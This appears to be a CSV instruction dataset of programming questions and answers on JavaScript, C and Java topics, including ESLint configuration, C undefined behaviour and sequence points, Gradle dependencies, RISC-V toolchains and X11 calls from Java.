instruction,input,output,Categories
eslint prettier parsing error unexpected token with,"I am fairly new to ESLint, Prettier, and Babel; still learning how they work together.  I am using Visual Studio Code 1.96.4, with ESLint and Prettier extensions.
In one of my javascript files, I have an import statement with a type assertion.  For example:
import * as manifest from './package.json' with { type: 'json' };
                                           ~~~~

My IDE is telling me that ESLint has an issue with the above import statement:
Parsing error: Unexpected token with | eslint

I have an eslint.config.js file, which exports an eslint.Linter.Config array that specifies my own config object (which has language options and rules), followed by a recommended config from @eslint/js, and the ESLint Prettier plugin recommended config.
import pluginJs from '@eslint/js';
import eslintPluginPrettier from 'eslint-plugin-prettier/recommended';
import globals from 'globals';

/** @type {import('eslint').Linter.Config[]} */
export default [
  {
    languageOptions: {
      globals: {
        ...globals.browser,
        ...globals.jest
      },
      ecmaVersion: 2024,
      sourceType: 'module'
    },
    rules: {
      ...
    }
  },
  pluginJs.configs.recommended,
  eslintPluginPrettier    // <-- Removing this fixes the problem, but then am I still running Prettier at lint-time?
];

These are the installed packages that (I think?) are relevant:
""devDependencies"": {
  ""@babel/core"": ""^7.26.0"",
  ""@babel/eslint-parser"": ""^7.26.5"",
  ""@babel/plugin-syntax-import-assertions"": ""^7.26.0"",
  ...
  ""@eslint/eslintrc"": ""^3.2.0"",
  ""@eslint/js"": ""^9.18.0"",
  ...
  ""eslint"": ""^9.18.0"",
  ""eslint-config-prettier"": ""^10.0.1"",
  ""eslint-plugin-prettier"": ""^5.2.3"",
  ...
  ""prettier"": ""^3.4.2"",
  ...
},

I also have a .prettierrc file that is a simple JSON object with only rules in it, no plugins or anything.  And I don't know if .babelrc has anything to do with this?
How can I make the IDE error go away, while still enforcing both ESLint and Prettier rules?
","You've already installed @babel/plugin-syntax-import-assertions, but you also need to make ESLint use @babel/eslint-parser with the correct configuration:
import pluginJs from '@eslint/js';
import eslintPluginPrettier from 'eslint-plugin-prettier/recommended';
import globals from 'globals';

/** @type {import('eslint').Linter.Config[]} */
export default [
  {
    parser: '@babel/eslint-parser',  // Set Babel as the parser
    parserOptions: {
      requireConfigFile: false,  // Prevents needing a separate Babel config file
      babelOptions: {
        plugins: ['@babel/plugin-syntax-import-assertions'],  // Ensure the plugin is enabled
      },
    },
    languageOptions: {
      globals: {
        ...globals.browser,
        ...globals.jest,
      },
      ecmaVersion: 2024,
      sourceType: 'module',
    },
    rules: {
      // Your custom rules
    },
  },
  pluginJs.configs.recommended,
  eslintPluginPrettier,  // Ensures Prettier runs as well
];

",javascript
what happens if you call free on non allocated memory returned by a function,"I am writing some random code and I wanted to know if there is there anything that defines how freeing memory returned like this works or if it is just undefined behavior.
struct a *get()
{
    static struct a value;

    return &value;
}

","From free() documentation:

If ptr is a null pointer, the function does nothing.
The behavior is undefined if the value of ptr does not equal a value
returned earlier by malloc(), calloc(), realloc(), or aligned_alloc()

I.e. if you free the return value from your get function (which is not a null pointer), you invoke undefined behavior, as it is not a value returned from malloc or similar.
",c
sequence points in c,"
A sequence point in imperative programming defines any point in a computer program's execution at which it is guaranteed that all side effects of previous evaluations will have been performed, and no side effects from subsequent evaluations have yet been performed.

What does this mean? Can somebody please explain it in simple words?
","When a sequence point occurs, it basically means that you are guaranteed that all previous operations are complete.
Changing a variable twice without an intervening sequence point is one example of undefined behaviour.
For example, i = i++; is undefined because there's no sequence point between the two changes to i.
Note that it's not just changing a variable twice that can cause a problem. It's actually a change involved with any other use. The standard uses the term ""value computation and side effect"" when discussing how things are sequenced. For example, in the expression a = i + i++, the i (value computation) and i++ (side effect) may be done in arbitrary order.
Wikipedia has a list of the sequence points in the C and C++ standards although the definitive list should always be taken from the ISO standard. From C11 appendix C (paraphrased):

The following are the sequence points described in the standard:

Between the evaluations of the function designator and actual arguments in a function call and the actual call;
Between the evaluations of the first and second operands of the operators &&, ||, and ,;
Between the evaluations of the first operand of the conditional ?: operator and whichever of the second and third operands is evaluated;
The end of a full declarator;
Between the evaluation of a full expression and the next full expression to be evaluated. The following are full expressions:

an initializer;
the expression in an expression statement;
the controlling expression of a selection statement (if or switch);
the controlling expression of a while or do statement;
each of the expressions of a for statement;
the expression in a return statement.


Immediately before a library function returns;
After the actions associated with each formatted input/output function conversion specifier;
Immediately before and immediately after each call to a comparison function, and also between any call to a comparison function and any movement of the objects passed as arguments to that call.

",c
expo camera cannot read property 39type39 of undefined,"import React, { useState, useEffect, useRef } from 'react';
import { SafeAreaView, View, Text, TouchableOpacity, StyleSheet } from 'react-native';
import { Camera } from 'expo-camera';

export default function HomePage() {
  const [hasCameraPermission, setHasCameraPermission] = useState(null);
  const cameraRef = useRef(null);

  useEffect(() => {
    (async () => {
      const { status } = await Camera.requestCameraPermissionsAsync();
      setHasCameraPermission(status === 'granted');
    })();
  }, []);

  const requestPermission = async () => {
    const { status } = await Camera.requestCameraPermissionsAsync();
    setHasCameraPermission(status === 'granted');
  };

  const takePicture = async () => {
    if (cameraRef.current) {
      try {
        const { uri } = await cameraRef.current.takePictureAsync();
        console.log('Picture taken:', uri);
      } catch (error) {
        console.error('Error taking picture:', error);
      }
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <View style={styles.cameraContainer}>
        {hasCameraPermission === null ? (
          <Text>Waiting for camera permission...</Text>
        ) : hasCameraPermission === false ? (
          <Text>Camera permission denied.</Text>
        ) : (
          <Camera
            style={styles.camera}
            type={Camera.Constants.Type.back}
            ref={cameraRef}
          />
        )}
      </View>
      <View style={styles.buttonContainer}>
        <TouchableOpacity style={styles.button} onPress={requestPermission}>
          <Text style={styles.buttonText}>Allow Permission</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.button} onPress={takePicture}>
          <Text style={styles.buttonText}>Take Picture</Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f0f0f0',
  },
  cameraContainer: {
    width: '100%',
    height: '70%',
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'black',
  },
  camera: {
    width: '100%',
    height: '100%',
  },
  buttonContainer: {
    flexDirection: 'row',
    justifyContent: 'space-around',
    alignItems: 'center',
    width: '100%',
    marginTop: 20,
  },
  button: {
    backgroundColor: '#3ABEF9',
    paddingVertical: 15,
    paddingHorizontal: 30,
    borderRadius: 10,
  },
  buttonText: {
    color: 'white',
    fontWeight: 'bold',
    fontSize: 16,
  },
});


app.json
{
  ""expo"": {
    ""name"": ""k"",
    ""slug"": ""k"",
    ""version"": ""1.0.0"",
    ""orientation"": ""portrait"",
    ""icon"": ""./assets/icon.png"",
    ""userInterfaceStyle"": ""light"",
    ""splash"": {
      ""image"": ""./assets/splash.png"",
      ""resizeMode"": ""contain"",
      ""backgroundColor"": ""#ffffff""
    },
    ""plugins"": [
      [
        ""expo-camera"",
        {
          ""cameraPermission"": ""Allow $(PRODUCT_NAME) to access your camera.""
        }
      ]
    ],
    ""ios"": {
      ""supportsTablet"": true
    },
    ""android"": {
      ""adaptiveIcon"": {
        ""foregroundImage"": ""./assets/adaptive-icon.png"",
        ""backgroundColor"": ""#ffffff""
      }
    },
    ""web"": {
      ""favicon"": ""./assets/favicon.png""
    }
  }
}


In this code i see the ""TypeError: Cannot read property 'Type' of undefined
This error is located at:
in HomePage (created by App)
in App (created by withDevTools(App))
in withDevTools(App)
in RCTView (created by View)
in View (created by AppContainer)
in RCTView (created by View)
in View (created by AppContainer)
in AppContainer
in main(RootComponent), js engine: hermes"" this error
","You used Camera.Constants.Type.back for type prop. Please import CameraType as I’ve shown below and check it:
import { Camera, CameraType } from 'expo-camera/legacy';
.
.
.
const [type, setType] = useState(CameraType.back);

And then use type state for type prop in <Camera>.
",javascript
build fails in gradle multiproject build due to dependency which is not used,"I am working on a Gradle multi-project that is what's happening:
Dependency X is used and declared in subproject A.
Subproject B depends on subproject A.
Build fails, because dependency X is missing in subproject B.
Edit I: Why does the build fail? Only A should need the dependency. This is the error message on :subprojectB:compileJava, where SomeClass comes from X.
C:\...\ClassSubpojectB.java:86: error: cannot access SomeClass
      //some code
                          ^
  class file for SomeClass not found
1 error

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':subprojectB:compileJava'.
> Compilation failed; see the compiler error output for details.

* Try:
> Run with --stacktrace option to get the stack trace.
> Run with --info or --debug option to get more log output.
> Run with --scan to get full insights.

* Get more help at https://help.gradle.org

BUILD FAILED in 1m 53s

Edit II: Dao.get is marked red in my IDE.
Bla bla = Dao.get(Bla .class, new Key(""id"", id));

with
  public static <O> O get(Class<O> c, Key key) {
    SomeClass s = key.getSomeClass();
    return get(c, s);
  }

SomeClass is only used in the body of get, so it should not be exposed. I that not correct?
","It looks like what's happening is that, on line 86 of ClassSubpojectB.java within subproject B, you call a method of a class in subproject A and that method returns a type from dependency X (namely SomeClass). Edit: Based on further information, it looks like one of the parameter types of that method (Key) exposes SomeClass as a return type on one of its methods.
Such a method call will cause the compilation of subproject B to fail. See eg this Gradle documentation for further details.
To fix, either:

change dependency X from an implementation dependency to an api dependency in subproject A (which requires applying the Java Library plugin in A if you've not done so already),
declare X as an implementation dependency in subproject B, or
refactor the API of A so that it does not expose any types from X, perhaps ""wrapping"" X types with your own.

",java
getting quotreobserveasconcast is not a functionquot error after updating to apollo client 3120,"I recently updated my Apollo Client version from 3.5.8 to 3.12.0, and now I'm encountering an error when using the useLazyQuery hook. The error states:
observable.reobserveAsConcast is not a function

This error appears to be triggered within the executeQuery function, which is used internally by useLazyQuery. Here's is the code: https://github.com/apollographql/apollo-client/blob/6ffb5a34a39657568db7f4e42ed60d8679cb817f/src/react/hooks/useLazyQuery.ts#L222
I'm using useLazyQuery like this:
const [
    fetchData,
    { data, loading: isLoading, error: fetchError },
] = useLazyQuery(SOME_QUERY, {
    fetchPolicy: ""no-cache"",
});

The error occurs whenever I trigger the fetchData function.
I also updated react from version 17 to 18
Are there any changes in how useLazyQuery or ObservableQuery should be used in Apollo Client 3.12.0?
I would greatly appreciate any guidance or insights into resolving this issue. Thank you!
","
Are there any changes in how useLazyQuery or ObservableQuery should be used in Apollo Client 3.12.0?

No, there are no such changes, and no changes that should cause this behaviour.
If I were to guess I would say that you might be combining a modern version of the hook with an outdated instance of ApolloClient here - check your node_modules folder and maybe yarn why @apollo/client/npm ls @apollo/client if by any chance you have more than one version of Apollo Client installed.
",javascript
assets folder in android studio unit test,"I have a Gradle project with the following structure:
project/
    src/
        androidTest/
            java/
        main/
            java/
            res/
            AndroidManifest.xml
    build.gradle

Now I want to add a unit test which uses a resource (either ""raw"" or ""asset""). 
I put my resource into project/androidTest/assets/test_file and access it with getContext().getResources().getAssets().open(""test_file""); (in an AndroidTestCase).
However, this gives me a FileNotFoundException. How can I fix this?
","It looks like you're trying to create an instrumented unit test, since you want to create it in the androidTest folder.
You can use one of these two options in your test to get the context:

Context ctx = InstrumentationRegistry.getTargetContext();
this one will give you your app's context. You can use it to grab assets that are in src/main/assets for example.

Context ctx = InstrumentationRegistry.getContext();
this one will give you the test app's context. You can use it to grab assets that are in src/androidTest/assets


If you want to know more about assets in unit testing you can read this post. In this github file you have an example.
Deprecation Note: As pointed out in the comments, these methods are now deprecated. This is the new recommended way:

First, instead of importing the old InstrumentationRegistry class, use the new one.
Instead of InstrumentationRegistry.getTargetContext(); use ApplicationProvider.getApplicationContext(). Source
Instead of InstrumentationRegistry.getTargetContext(); use ApplicationProvider.getApplicationContext(). Source
For InstrumentationRegistry.getTargetContext();: In most scenarios, ApplicationProvider.getApplicationContext() should be used instead of the instrumentation test context. If you do need access to the test context for to access its resources, it is recommended to use PackageManager.getResourcesForApplication(String) instead.
Source

",java
gnu riscv embedded gcc throws quotx isa extension xw39 must be set with the versionsquot error,"I can build the c-files from my WCH CH32V003F4P6 microcontroller project with the GNU RISC-V Embedded GCC v8.2.0 toolchain shipped with the Eclipse IDE from WCH (MounRiver Studio). However, if I try to build the same c-files with a similar toolchain downloaded here (see https://xpack.github.io/dev-tools/riscv-none-elf-gcc/releases/), then I get incomprehensible errors like:
Error: x ISA extension 'xw' must be set with the versions
or
cc1.exe: error: -march=rv32ecxw: unsupported ISA substring 'xw'
Reproduce the problem
To reproduce the problem, you should:

First install MounRiver Studio (see http://www.mounriver.com/download)

Second, download the microcontroller sample projects from http://www.wch-ic.com/products/CH32V003.html (see the CH32V003EVT.ZIP file at the bottom of the webpage). Unzip it to your C:/ drive. The GPIO_Toggle sample project is now at ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/"".


Let's now compile the main.c file from the GPIO_Toggle project, like this:
> ""C:/MounRiver/MounRiver_Studio/toolchain/RISC-V Embedded GCC/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -msmall-data-limit=0
    -msave-restore
    -fsigned-char
    -fno-common
    -Wunused
    -Wuninitialized
    -Og
    -g3
    -fmessage-length=0
    -ffunction-sections
    -fdata-sections
    -Wno-comment
    -Wno-unused-function
    -std=gnu99
    -Werror-implicit-function-declaration
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Core""
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Debug""
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Peripheral/inc""
    -I""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/User""
    ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/User/main.c""
    -o ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/build/main.o""
    -c

This should work.
Let's try with a few other toolchains. Download some GNU RISC-V Embedded GCC toolchains from here: https://xpack.github.io/dev-tools/riscv-none-elf-gcc/releases/
Unzip them to your C:/ drive:

Now invoke the same compilation command with each of these toolchains:
> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x32/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x64/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

> ""C:/xpack-riscv-none-elf-gcc-12.2.0-3-win32-x64/bin/riscv-none-elf-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

I got these obscure errors:

Error: x ISA extension 'xw' must be set with the versions

cc1.exe: error: -march=rv32ecxw: unsupported ISA substring 'xw'


I can't wrap my head around them.
Compare the toolchains
As a first reaction, I compare the toolchains. The one from MounRiver Studio outputs the following for --version:
> ""C:/MounRiver/MounRiver_Studio/toolchain/RISC-V Embedded GCC/bin/riscv-none-embed-gcc"" --version
riscv-none-embed-gcc (xPack GNU RISC-V Embedded GCC, 32-bit) 8.2.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

I get the exact same output from one of the other toolchains:
> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x32/bin/riscv-none-embed-gcc"" --version
riscv-none-embed-gcc (xPack GNU RISC-V Embedded GCC, 32-bit) 8.2.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

So they must be identical, no? How then is it possible that the one from MounRiver works and the other one doesn't?
","The xPack GNU RISC-V Embedded GCC supports only the standard RISC-V extensions. The 'xw' extension is custom one, added by WCH for their own designs, and is supported only by their custom toolchain.
",c
how to change the look and feel in netbeans gui designer preview,"When using the NetBeans GUI Builder the ""Preview Design"" feature shows the panel with the system look and feel (e.g. Windows). Now I want to preview my panel with a different LaF to get all the gaps and spaces right. Is there a way to tell the gui builder to display the panel with a different LaF?
","The only thing I can find is: 
Inspector > Right click on your JFrame > Preview Design

",java
how to manage taskbar from javafx via native code in linux,"I'm trying get more experience with the new Foreign Function & Memory API in Java 22+. The best way
how to learn a new API is by using it in a project.
My project’s goal is to report on the taskbar the progress of some long-running task.
As far as I know, there is no ""native"" support of this in JavaFX.
There are some libraries like
FXTaskbarProgressBar which serves the
purpose, but only for Windows OS. And it is using the ""old"" Java Native Interface (JNI).
After a short research, I found a simple Go library
taskbar. This library inspired me to try porting to Java for JavaFX.
First I used jextract to get java bindings to native library calls:
jextract --output target/generated-sources/jextract -t ""taskbar_test.gen"" --include-function ""XOpenDisplay"" --include-function ""XChangeProperty"" --include-function ""XFlush"" --include-function ""XCloseDisplay"" /usr/include/X11/Xlib.h

Then I created a simple application to simulate long running process
where I try to update progress on taskbar by calling method
""XChangeProperty"" which I found in documentation of X11:
https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
Unfortunately this does not work. The program does not crash,
task is running on background, but no update on taskbar is happening.
Here is the code I created:
package taskbar_test;

import com.sun.glass.ui.Window;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
import taskbar_test.gen.Xlib_h;

import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;


public class AppLinuxXlib extends Application {

    @Override
    public void start(Stage primaryStage) {
        Button startButton = new Button(""Start Long Running Task"");

        startButton.setOnAction(event -> {
            final long rawHandle = Window.getWindows().getFirst().getRawHandle();
            System.out.println(rawHandle);
            // Create a long-running task
            Task<Void> longTask = new Task<>() {
                @Override
                protected Void call() throws Exception {
                    System.out.println(""Started"");

                    try (var arena = Arena.ofConfined()) {
                        var NET_WM_XAPP_PROGRESS = arena.allocateFrom(""NET_WM_XAPP_PROGRESS"");
//                        var NET_WM_XAPP_PROGRESS_PULSE = arena.allocateFrom(""NET_WM_XAPP_PROGRESS_PULSE"");

                        MemorySegment x11Session = Xlib_h.XOpenDisplay(MemorySegment.NULL);
                        System.out.println(x11Session);

                        // Prepare the progress data
                        MemorySegment initData = arena.allocateFrom(ValueLayout.JAVA_INT, 0);
                        Xlib_h.XChangeProperty(x11Session,                    // display
                                MemorySegment.ofAddress(rawHandle).address(), // window
                                NET_WM_XAPP_PROGRESS.address(),               // property
                                6,                                            // type
                                32,                                           // format
                                0,                                            // mode PropModeReplace=0
                                initData,                                     // data
                                1);                                           // nelements
                        Xlib_h.XFlush(x11Session);

                        System.out.println(""Countdown started"");

                        // Set the taskbar progress
                        for (int i = 0; i <= 100; i+=20) {
                            // Simulate work
                            Thread.sleep(500);
                            System.out.println(i);
                            MemorySegment progressData = arena.allocateFrom(ValueLayout.JAVA_INT, i);
                            // Update taskbar progress
                            // https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
                            Xlib_h.XChangeProperty(x11Session,                    // display
                                    MemorySegment.ofAddress(rawHandle).address(), // window
                                    NET_WM_XAPP_PROGRESS.address(),               // property
                                    6,                                            // type
                                    32,                                           // format
                                    0,                                            // mode PropModeReplace=0
                                    progressData,                                 // data
                                    1);                                           // nelements
                            Xlib_h.XFlush(x11Session);
                        }
                        System.out.println(""Finished"");
                        Xlib_h.XCloseDisplay(x11Session);

                    } catch (Throwable ex) {
                        ex.printStackTrace();
                    }
                    return null;
                }
            };

            // Start the task in a new thread
            new Thread(longTask).start();
        });

        VBox vbox = new VBox(10, startButton);
        Scene scene = new Scene(vbox, 300, 200);
        primaryStage.setScene(scene);
        primaryStage.setTitle(""Taskbar Progress Example Linux"");
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}

Can someone show me what am I doing wrong and maybe point me to the correct
direction with how to make the implementation work?
Thank you very much.
Petr
","I wasn’t able to solve this, but I suspect it’s because I am running Gnome 43.9 Classic, and I’m not sure it supports showing progress in taskbar buttons.  But I can provide some advice, at least:

The Window type in X is not a pointer or address.  It is an XID, which is usually a 32-bit integer.
The property argument is an Atom, which is also an XID, not an address or pointer.  An Atom must be obtained by passing the atom’s string name to XInternAtom.
The name of the Atom, from what I can gather, starts with an underscore:  _NET_WM_XAPP_PROGRESS  (I don’t understand why there is so little documentation about this property on the web.)

With those things in mind, I changed your code to this.  (I replaced the taskbar_test.gen.Xlib_h package with explicit calls to java.lang.foreign.)
import com.sun.glass.ui.Window;

import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import java.lang.invoke.MethodHandle;

import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;
import java.lang.foreign.Linker;
import java.lang.foreign.SymbolLookup;
import java.lang.foreign.FunctionDescriptor;

public class AppLinuxXlib extends Application {
    private static final int None = 0;              // from X.h
    private static final int False = 0;             // from Xlib.h
    private static final int PropModeReplace = 0;   // from X.h

    private static final int XA_CARDINAL = 6;       // from Xatom.h

    private MethodHandle XOpenDisplay;
    private MethodHandle XCloseDisplay;
    private MethodHandle XInternAtom;
    private MethodHandle XChangeProperty;
    private MethodHandle XFlush;

    @Override
    public void init()
    throws Exception {
        Linker linker = Linker.nativeLinker();
        SymbolLookup lookup = SymbolLookup.loaderLookup();

        XOpenDisplay = linker.downcallHandle(
            lookup.findOrThrow(""XOpenDisplay""),
            FunctionDescriptor.of(
                ValueLayout.ADDRESS,                            // returns Display *
                ValueLayout.ADDRESS.withName(""display_name"")    // char *display_name
            ));
        XCloseDisplay = linker.downcallHandle(
            lookup.findOrThrow(""XCloseDisplay""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                           // returns int
                ValueLayout.ADDRESS.withName(""display"")         // Display *display
            ));
        XInternAtom = linker.downcallHandle(
            lookup.findOrThrow(""XInternAtom""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                            // returns Atom
                ValueLayout.ADDRESS.withName(""display""),         // Display *display
                ValueLayout.ADDRESS.withName(""atom_name""),       // char *atom_name
                ValueLayout.JAVA_INT.withName(""only_if_exists"")  // Bool only_if_exists
            ));
        XChangeProperty = linker.downcallHandle(
            lookup.findOrThrow(""XChangeProperty""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                       // returns int
                ValueLayout.ADDRESS.withName(""display""),    // Display *display
                ValueLayout.JAVA_INT.withName(""w""),         // Window w
                ValueLayout.JAVA_INT.withName(""property""),  // Atom property
                ValueLayout.JAVA_INT.withName(""type""),      // Atom type
                ValueLayout.JAVA_INT.withName(""format""),    // int format
                ValueLayout.JAVA_INT.withName(""mode""),      // int mode
                ValueLayout.ADDRESS.withName(""data""),       // char *data
                ValueLayout.JAVA_INT.withName(""nelements"")  // int nelements
            ));
        XFlush = linker.downcallHandle(
            lookup.findOrThrow(""XFlush""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                   // returns int
                ValueLayout.ADDRESS.withName(""display"") // Display *display
            ));
    }

    private MemorySegment XOpenDisplay(MemorySegment display)
    throws Throwable {
        return (MemorySegment) XOpenDisplay.invokeExact(display);
    }

    private int XCloseDisplay(MemorySegment display)
    throws Throwable {
        return (int) XCloseDisplay.invokeExact(display);
    }

    private int XInternAtom(MemorySegment display,
                            MemorySegment atomName,
                            int onlyIfExists)
    throws Throwable {
        return (int) XInternAtom.invokeExact(display, atomName, onlyIfExists);
    }

    private int XFlush(MemorySegment display)
    throws Throwable {
        return (int) XFlush.invokeExact(display);
    }

    private int XChangeProperty(MemorySegment display,
                                int window,
                                int property,
                                int type,
                                int format,
                                int mode,
                                MemorySegment data,
                                int dataLen)
    throws Throwable {
        return (int) XChangeProperty.invokeExact(display,
            window, property, type, format, mode, data, dataLen);
    }

    @Override
    public void start(Stage primaryStage) {
        Button startButton = new Button(""Start Long Running Task"");

        startButton.setOnAction(event -> {
            final int window = (int) Window.getWindows().getFirst().getNativeWindow();
            System.out.printf(""Window=%#x%n"", window);
            // Create a long-running task
            Task<Void> longTask = new Task<>() {
                @Override
                protected Void call() throws Exception {
                    System.out.println(""Started"");

                    try (var arena = Arena.ofConfined()) {
                        MemorySegment x11Session = XOpenDisplay(MemorySegment.NULL);
                        System.out.println(""display="" + x11Session);

                        var name = arena.allocateFrom(""_NET_WM_XAPP_PROGRESS"");
                        var NET_WM_XAPP_PROGRESS = XInternAtom(x11Session, name, 0);
                        if (NET_WM_XAPP_PROGRESS == None) {
                            throw new RuntimeException(""XInternAtom failed."");
                        }
//                        var NET_WM_XAPP_PROGRESS_PULSE = arena.allocateFrom(""NET_WM_XAPP_PROGRESS_PULSE"");

                        // Prepare the progress data
                        MemorySegment progressData = arena.allocateFrom(ValueLayout.JAVA_INT, 0);
                        int status = XChangeProperty(
                                x11Session,                                   // display
                                window,                                       // window
                                NET_WM_XAPP_PROGRESS,                         // property
                                XA_CARDINAL,                                  // type
                                32,                                           // format
                                PropModeReplace,                              // mode
                                progressData,                                 // data
                                1);                                           // nelements
                        if (status == False) {
                            throw new RuntimeException(""XChangeProperty returned "" + status);
                                    
                        }

                        status = XFlush(x11Session);
                        if (status == False) {
                            throw new RuntimeException(""XFlush returned "" + status);
                        }

                        System.out.println(""Countdown started"");

                        // Set the taskbar progress
                        for (int i = 0; i <= 100; i+=20) {
                            // Simulate work
                            Thread.sleep(500);
                            System.out.println(i);
                            progressData.set(ValueLayout.JAVA_INT, 0, i);
                            // Update taskbar progress
                            // https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
                            status = XChangeProperty(
                                    x11Session,                                   // display
                                    window,                                       // window
                                    NET_WM_XAPP_PROGRESS,                         // property
                                    XA_CARDINAL,                                  // type
                                    32,                                           // format
                                    PropModeReplace,                              // mode
                                    progressData,                                 // data
                                    1);                                           // nelements
                            if (status == False) {
                                throw new RuntimeException(""XChangeProperty returned "" + status);
                            }

                            status = XFlush(x11Session);
                            if (status == False) {
                                throw new RuntimeException(""XFlush returned "" + status);
                            }
                        }
                        System.out.println(""Finished"");
                        XCloseDisplay(x11Session);

                    } catch (Throwable ex) {
                        ex.printStackTrace();
                    }
                    return null;
                }
            };

            // Start the task in a new thread
            new Thread(longTask).start();
        });

        VBox vbox = new VBox(10, startButton);
        Scene scene = new Scene(vbox, 300, 200);
        primaryStage.setScene(scene);
        primaryStage.setTitle(""Taskbar Progress Example Linux"");
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}

This runs, but has no visual effect on my system.  I don’t know if that’s because my version of Gnome doesn’t support it.  I also tried using the xprop program to set the same window property, and that too had no effect.
",java
